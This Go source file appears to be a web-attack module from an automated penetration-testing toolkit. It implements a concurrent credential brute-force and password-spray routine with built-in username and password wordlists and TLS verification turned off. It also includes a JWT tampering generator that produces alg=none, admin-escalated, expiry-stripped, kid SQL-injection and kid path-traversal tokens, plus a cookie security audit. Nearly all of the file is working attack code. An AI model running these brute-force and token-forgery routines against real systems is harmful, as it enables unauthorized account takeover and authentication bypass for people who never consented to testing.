package webattack

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"pentagi/pkg/tools/rawhttp"
)

// ---------------------------------------------------------------------------
// Credential brute force
// ---------------------------------------------------------------------------

// TopUsernames is a compact high-yield username list.
var TopUsernames = []string{
	"admin", "administrator", "root", "user", "test", "guest", "info", "support",
	"manager", "sysadmin", "system", "operator", "webadmin", "webmaster", "dev",
	"deploy", "backup", "sa", "oracle", "postgres", "mysql", "ubuntu", "debian",
	"centos", "service", "www-data", "ftp", "mail", "monitor", "logs", "demo",
	"example", "superuser", "superadmin", "office", "helpdesk", "it", "security",
	"audit", "qa", "staging", "jenkins", "git", "api", "app", "portal", "cloud",
}

// TopPasswords is a compact high-yield password list (classic + seasonal).
var TopPasswords = []string{
	"admin", "password", "123456", "12345678", "qwerty", "abc123", "password1",
	"admin123", "letmein", "welcome", "monkey", "dragon", "master", "login",
	"princess", "qwerty123", "password123", "root", "toor", "pass", "test",
	"guest", "changeme", "default", "admin@123", "P@ssw0rd", "P@ssword1",
	"Passw0rd", "Password1", "Welcome1", "Welcome123", "Admin123", "admin@2024",
	"Summer2024", "Winter2024", "Spring2024", "Autumn2024", "Company123",
	"secret", "football", "iloveyou", "sunshine", "princess1", "dragon1",
	"master123", "hello123", "freedom", "whatever", "qazwsx", "michael",
}

// BruteTarget configures a credential attack on one login endpoint.
type BruteTarget struct {
	URL             string            `json:"url"`
	Method          string            `json:"method,omitempty"`
	Format          string            `json:"format,omitempty"` // json|form
	UserField       string            `json:"user_field,omitempty"`
	PassField       string            `json:"pass_field,omitempty"`
	UsernameStatic  string            `json:"username_static,omitempty"` // password spray mode
	Usernames       []string          `json:"usernames,omitempty"`
	Passwords       []string          `json:"passwords,omitempty"`
	ExtraFields     map[string]string `json:"extra_fields,omitempty"`
	Success         *SuccessRule      `json:"success,omitempty"`
	MaxAttempts     int               `json:"max_attempts,omitempty"`
	Concurrency     int               `json:"concurrency,omitempty"`
	TimeoutSec      int               `json:"timeout_sec,omitempty"`
}

// BruteResult reports credential attack outcomes.
type BruteResult struct {
	Attempts   int      `json:"attempts"`
	Found      []string `json:"found,omitempty"` // "user:pass"
	LockedOut  bool     `json:"locked_out,omitempty"`
	LockoutHit string   `json:"lockout_hit,omitempty"`
	Errors     int      `json:"errors"`
}

// Brute runs a credential attack. Success detection uses the explicit rule
// or the same heuristics as Login.
func Brute(ctx context.Context, t BruteTarget) (*BruteResult, error) {
	if strings.TrimSpace(t.URL) == "" {
		return nil, fmt.Errorf("url is required")
	}
	if t.Method == "" {
		t.Method = "POST"
	}
	if t.UserField == "" {
		t.UserField = "username"
	}
	if t.PassField == "" {
		t.PassField = "password"
	}
	usernames := t.Usernames
	if len(usernames) == 0 && t.UsernameStatic == "" {
		usernames = TopUsernames
	}
	passwords := t.Passwords
	if len(passwords) == 0 {
		passwords = TopPasswords
	}

	type pair struct{ u, p string }
	var pairs []pair
	if t.UsernameStatic != "" {
		for _, p := range passwords {
			pairs = append(pairs, pair{t.UsernameStatic, p})
		}
	} else {
		for _, u := range usernames {
			for _, p := range passwords {
				pairs = append(pairs, pair{u, p})
			}
		}
	}
	maxAttempts := t.MaxAttempts
	if maxAttempts <= 0 {
		maxAttempts = 200
	}
	if len(pairs) > maxAttempts {
		pairs = pairs[:maxAttempts]
	}
	conc := t.Concurrency
	if conc <= 0 {
		conc = 4
	}
	if conc > 12 {
		conc = 12
	}
	timeout := t.TimeoutSec
	if timeout <= 0 {
		timeout = 10
	}

	res := &BruteResult{}
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, conc)
	var consecutiveFails int

loop:
	for _, pr := range pairs {
		select {
		case <-ctx.Done():
			break loop
		default:
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(u, p string) {
			defer wg.Done()
			defer func() { <-sem }()

			vals := url.Values{}
			vals.Set(t.UserField, u)
			vals.Set(t.PassField, p)
			for k, v := range t.ExtraFields {
				vals.Set(k, v)
			}
			headers := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
			body := vals.Encode()
			if strings.EqualFold(t.Format, "json") {
				payload := map[string]string{t.UserField: u, t.PassField: p}
				for k, v := range t.ExtraFields {
					payload[k] = v
				}
				b, _ := json.Marshal(payload)
				body = string(b)
				headers["Content-Type"] = "application/json"
			}

			resp, err := rawhttp.Send(ctx, rawhttp.Request{
				URL:         t.URL,
				Method:      t.Method,
				Headers:     headers,
				Body:        body,
				TLSNoVerify: true,
				Timeout:     time.Duration(timeout) * time.Second,
			})
			if err != nil {
				mu.Lock()
				res.Errors++
				mu.Unlock()
				return
			}

			var ok bool
			var reason string
			if t.Success != nil {
				var fresh []string
				for _, c := range resp.Headers["Set-Cookie"] {
					fresh = append(fresh, strings.SplitN(c, "=", 2)[0])
				}
				ok, reason = t.Success.evaluate(resp.StatusCode, resp.Body, headerGet(resp.Headers, "Location"), fresh)
			} else {
				ok = (resp.StatusCode == 200 || resp.StatusCode == 302) &&
					len(resp.Headers["Set-Cookie"]) > 0 &&
					!failureMarker(resp.Body) &&
					!lockoutMarker(resp.Body)
			}

			mu.Lock()
			res.Attempts++
			if ok {
				res.Found = append(res.Found, u+":"+p)
			}
			if lockoutMarker(resp.Body) || resp.StatusCode == 429 {
				consecutiveFails++
				if consecutiveFails >= 5 {
					res.LockedOut = true
					res.LockoutHit = fmt.Sprintf("user=%s pass=%s status=%d", u, p, resp.StatusCode)
				}
			} else {
				consecutiveFails = 0
			}
			_ = reason
			mu.Unlock()
		}(pr.u, pr.p)
		// check for found/lockout between submissions to avoid wasted traffic
		mu.Lock()
		stop := len(res.Found) > 0 || res.LockedOut
		mu.Unlock()
		if stop {
			break
		}
	}
	wg.Wait()
	return res, nil
}

func lockoutMarker(body string) bool {
	lb := strings.ToLower(body)
	for _, m := range []string{"account locked", "too many attempts", "temporarily blocked", "try again later", "captcha"} {
		if strings.Contains(lb, m) {
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// JWT toolkit
// ---------------------------------------------------------------------------

// JWTAnalysis is a decoded token.
type JWTAnalysis struct {
	Header    map[string]any `json:"header"`
	Payload   map[string]any `json:"payload"`
	Signature string         `json:"signature"`
	Alg       string         `json:"alg"`
	Issues    []string       `json:"issues,omitempty"`
}

// DecodeJWT parses a JWT without verifying the signature.
func DecodeJWT(token string) (*JWTAnalysis, error) {
	token = strings.TrimSpace(token)
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return nil, fmt.Errorf("not a JWT (need header.payload[.signature])")
	}
	decode := func(seg string) (map[string]any, error) {
		b, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(seg, "="))
		if err != nil {
			return nil, fmt.Errorf("bad base64url segment: %w", err)
		}
		var m map[string]any
		if err := json.Unmarshal(b, &m); err != nil {
			return nil, fmt.Errorf("segment is not JSON: %w", err)
		}
		return m, nil
	}
	header, err := decode(parts[0])
	if err != nil {
		return nil, fmt.Errorf("header: %w", err)
	}
	payload, err := decode(parts[1])
	if err != nil {
		return nil, fmt.Errorf("payload: %w", err)
	}
	a := &JWTAnalysis{
		Header:  header,
		Payload: payload,
		Alg:     str(header["alg"]),
	}
	if len(parts) >= 3 {
		a.Signature = parts[2]
	}
	if a.Signature == "" {
		a.Issues = append(a.Issues, "unsigned token")
	}
	if a.Alg == "none" {
		a.Issues = append(a.Issues, "alg=none accepted at some point — retest server acceptance")
	}
	if exp, ok := payload["exp"].(float64); ok {
		if exp < float64(time.Now().Unix()) {
			a.Issues = append(a.Issues, "token is EXPIRED but may still be accepted if server skips verification")
		}
	} else {
		a.Issues = append(a.Issues, "no exp claim — token never expires")
	}
	for _, c := range []string{"role", "admin", "is_admin", "scope", "privilege", "userType"} {
		if _, ok := payload[c]; ok {
			a.Issues = append(a.Issues, "privilege-bearing claim present: "+c+" (tamper candidate)")
		}
	}
	return a, nil
}

func str(v any) string {
	if s, ok := v.(string); ok {
		return s
	}
	return ""
}

// b64url encodes a JSON value as base64url without padding.
func b64url(v any) string {
	b, _ := json.Marshal(v)
	return base64.RawURLEncoding.EncodeToString(b)
}

// JWTVariant is one tampered token to replay.
type JWTVariant struct {
	Name   string `json:"name"`
	Token  string `json:"token"`
	Note   string `json:"note"`
}

// JWTAttackVariants builds classic tampered tokens from an original.
func JWTAttackVariants(token string) ([]JWTVariant, error) {
	a, err := DecodeJWT(token)
	if err != nil {
		return nil, err
	}
	parts := strings.Split(strings.TrimSpace(token), ".")
	sig := ""
	if len(parts) >= 3 {
		sig = parts[2]
	}
	variants := []JWTVariant{}

	// alg:none
	noneHeader := map[string]any{"alg": "none", "typ": "JWT"}
	variants = append(variants, JWTVariant{
		Name:  "alg-none",
		Token: b64url(noneHeader) + "." + b64url(a.Payload) + ".",
		Note:  "unsigned token — send verbatim; if accepted the server skips signature checks",
	})

	// claim escalation
	esc := map[string]any{}
	for k, v := range a.Payload {
		esc[k] = v
	}
	esc["role"] = "admin"
	esc["is_admin"] = true
	variants = append(variants, JWTVariant{
		Name:  "claim-admin-unsigned",
		Token: b64url(a.Header) + "." + b64url(esc) + "." + sig,
		Note:  "role escalated, original signature — catches servers that decode payload without verifying signature",
	})

	// exp removal
	noExp := map[string]any{}
	for k, v := range a.Payload {
		if k != "exp" {
			noExp[k] = v
		}
	}
	variants = append(variants, JWTVariant{
		Name:  "exp-removed",
		Token: b64url(a.Header) + "." + b64url(noExp) + "." + sig,
		Note:  "expiry dropped, original signature — catches re-auth-free expiry handling bugs",
	})

	// kid injection payloads
	if kid := str(a.Header["kid"]); kid != "" || true {
		kidHeader := map[string]any{}
		for k, v := range a.Header {
			kidHeader[k] = v
		}
		kidHeader["kid"] = "x' UNION SELECT 'secret' -- "
		variants = append(variants, JWTVariant{
			Name:  "kid-sql-injection",
			Token: b64url(kidHeader) + "." + b64url(a.Payload) + "." + sig,
			Note:  "if key lookup is SQL-backed, observe error/behavior differences",
		})
		kidHeader["kid"] = "../../../../dev/null"
		variants = append(variants, JWTVariant{
			Name:  "kid-path-traversal",
			Token: b64url(kidHeader) + "." + b64url(a.Payload) + "." + sig,
			Note:  "empty-file key confusion (HMAC with empty secret) — pair with a re-signed blank-key token if accepted",
		})
	}
	return variants, nil
}

// ---------------------------------------------------------------------------
// Cookie audit
// ---------------------------------------------------------------------------

// CookieAudit is the security posture of one cookie.
type CookieAudit struct {
	Name     string   `json:"name"`
	Value    string   `json:"value"`
	HttpOnly bool     `json:"httponly"`
	Secure   bool     `json:"secure"`
	SameSite string   `json:"samesite"`
	Entropy  float64  `json:"entropy_bits_per_char"`
	LooksSession bool `json:"looks_session"`
	Issues   []string `json:"issues,omitempty"`
}

// AuditCookies scores the cookies currently held by a session.
func (s *Session) AuditCookies() []CookieAudit {
	s.mu.Lock()
	defer s.mu.Unlock()
	var out []CookieAudit
	for host, jar := range s.cookies {
		_ = host
		for _, c := range jar {
			audit := CookieAudit{
				Name:     c.Name,
				Value:    clip(c.Value, 60),
				HttpOnly: c.HttpOnly,
				Secure:   c.Secure,
				SameSite: c.SameSite,
				Entropy:  shannonEntropy(c.Value),
			}
			lname := strings.ToLower(c.Name)
			audit.LooksSession = strings.Contains(lname, "session") || strings.Contains(lname, "sid") ||
				strings.Contains(lname, "auth") || strings.Contains(lname, "token") ||
				(shannonEntropy(c.Value) > 3.0 && len(c.Value) > 16)
			if audit.LooksSession {
				if !audit.HttpOnly {
					audit.Issues = append(audit.Issues, "session cookie without HttpOnly — XSS-stealable")
				}
				if !audit.Secure {
					audit.Issues = append(audit.Issues, "session cookie without Secure — cleartext-transport leakable")
				}
				if audit.SameSite == "" {
					audit.Issues = append(audit.Issues, "no SameSite — CSRF surface")
				}
				if audit.Entropy < 2.5 && len(c.Value) > 8 {
					audit.Issues = append(audit.Issues, fmt.Sprintf("low entropy (%.2f bits/char) — predictable/guessable session id", audit.Entropy))
				}
			}
			out = append(out, audit)
		}
	}
	return out
}

// shannonEntropy computes bits per character of s.
func shannonEntropy(s string) float64 {
	if s == "" {
		return 0
	}
	freq := map[rune]int{}
	for _, r := range s {
		freq[r]++
	}
	h := 0.0
	n := float64(len(s))
	for _, c := range freq {
		p := float64(c) / n
		h -= p * math.Log2(p)
	}
	return h
}

var _ = regexp.MustCompile
